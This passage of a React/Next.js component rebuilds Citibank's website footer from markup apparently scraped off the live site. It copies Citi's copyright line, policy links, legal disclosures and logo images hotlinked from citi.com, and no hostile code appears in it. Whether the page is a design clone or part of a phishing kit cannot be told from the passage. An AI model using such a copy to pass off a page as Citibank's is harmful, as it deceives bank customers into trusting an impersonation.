                                <li className="ng-star-inserted">
                                <button data-target="#modal20" aria-label="x" className="https://www.citi.com/CBOL/IA/Angular/assets/Citi_Icon_Sprite_v2.svg ng-star-inserted">
                                  <Image width={500} height={500} id="x" alt="x" src="https://www.citi.com/CBOL/IA/Angular/assets/Citi_Icon_Sprite_v2.svg" className="x" />
                                </button>
                                </li>
                                <li className="ng-star-inserted">
                                <button data-target="#modal20" aria-label="youtube" className="https://www.citi.com/CBOL/IA/Angular/assets/Citi_Icon_Sprite_v2.svg ng-star-inserted">
                                  <Image width={500} height={500} id="youtube" alt="youtube" src="https://www.citi.com/CBOL/IA/Angular/assets/Citi_Icon_Sprite_v2.svg" className="youtube" />
                                </button>
                                </li>
                            </ul>


                        </div>

                    </div>
                  </div>

                  <div className="ng-star-inserted">
                    <div className="sub-navigation ng-star-inserted">
                      <div className="content">
                      <p className="copyright ng-star-inserted">© 2025 Citigroup Inc</p>

                      <ul className="ng-star-inserted">
                          <li id="subnavTermsConditions" className="ng-star-inserted">
                            <div className="ng-star-inserted">
                            <a  className="cta-link btn btn-link ng-star-inserted" target="_self" id="d4700710-a15f-421b-e3d3-ebfeba7805bd" href="#">Terms &amp; Conditions</a>
                            </div>
                          </li>
                          <li id="subnavTermsConditions" className="ng-star-inserted">
                            <div className="ng-star-inserted">
                            <a  className="cta-link btn btn-link ng-star-inserted" target="_self" id="283dffa3-aff8-864a-eefe-9810e8fd00f2" href="/policies/us-privacy-notice-for-consumers">Privacy</a>
                            </div>
                          </li>
                          <li id="subnavTermsConditions" className="ng-star-inserted">
                            <div className="ng-star-inserted">
                              <a className="cta-link btn btn-link ng-star-inserted" target="_self" id="eec5b428-57e1-4e23-b8a5-042aa1eb2d5a" href="/policies/us-privacy-notice-for-consumers#info-collect">Notice at Collection</a>
                            </div>
                          </li>
                          <li id="subnavTermsConditions" className="ng-star-inserted">
                            <div className="ng-star-inserted">
                            <a  className="cta-link btn btn-link ng-star-inserted" target="_self" id="0fc6d7c5-b8f6-05de-9dcf-377a4b86be04" href="/dataprivacyhub/cpra/home">Do Not Sell or Share My Personal Information</a>
                            </div>
                          </li>
                          <li id="subnavTermsConditions" className="ng-star-inserted">
                            <div className="ng-star-inserted">
                            <a className="cta-link btn btn-link ng-star-inserted" target="_self" id="345428c9-9442-1cef-eeae-00644bec4892" href="/accessibility">Accessibility</a>
                            </div>
                          </li>
                      </ul>

                      </div>
                    </div>

                  </div>

                  <div className="ng-star-inserted" style={{marginTop: '1em'}}>
                    <div className="disclaimer ng-star-inserted">
                      <div className="content">
                      <div _ngcontent-ssr-c2874854768="" className="text"><h4 aria-level="3">
                        Important Legal Disclosures &amp; Information</h4><p>Citibank.com provides information about and access to accounts and financial services provided by Citibank, N.A. and its affiliates in the United States and its territories. It does not, and should not be construed as, an offer, invitation or solicitation of services to individuals outside of the United States.</p><p>Terms, conditions and fees for accounts, products, programs and services are subject to change. Not all accounts, products, and services as well as pricing described here are available in all jurisdictions or to all customers. Your eligibility for a particular product and service is subject to a final determination by Citibank. Your country of citizenship, domicile, or residence, if other than the United States, may have laws, rules, and regulations that govern or affect your application for and use of our accounts, products and services, including laws and regulations regarding taxes, exchange and/or capital controls that you are responsible for following.</p><p>The products, account packages, promotional offers and services described in this website may not apply to customers of <a target="_blank" className="link" href="https://www.citi.com/ipb-us/banking/home">International Personal Bank U.S.</a> in the Citigold<sup>®</sup> Private Client International, Citigold<sup>®</sup> International, Citi International Personal, Citi Global Executive Preferred, and Citi Global Executive Account Packages.</p><p>Deposit products and services are offered by Citibank, N.A., Member FDIC</p>
                      </div>
                      </div>

                    </div>

                  </div>

                  <div  className="ng-star-inserted">
                    <div  className="sub-footer ng-star-inserted">
                      <div  className="content"></div>
                      <div className="footerLogo ng-star-inserted">
                        <Image alt="Citi Banner" width={500} height={500} aria-label="Citi Banner" className="imgBottomCitiLogo_Mobile" src="https://online.citi.com/CBOL/IA/Angular/assets/citiredesign-footer.svg" />
                        {/* <Image  alt="Citi Banner" width={500} height={500} aria-label="Citi Banner" class="imgBottomCitiLogo_Desktop" src="https://online.citi.com/CBOL/IA/Angular/assets/citiredesign-footer.svg" /> */}
                        </div>
                        </div>
                    </div>

                </div>

              </div>




          </div>

        </div>





      </div>

    </div>
  );
}
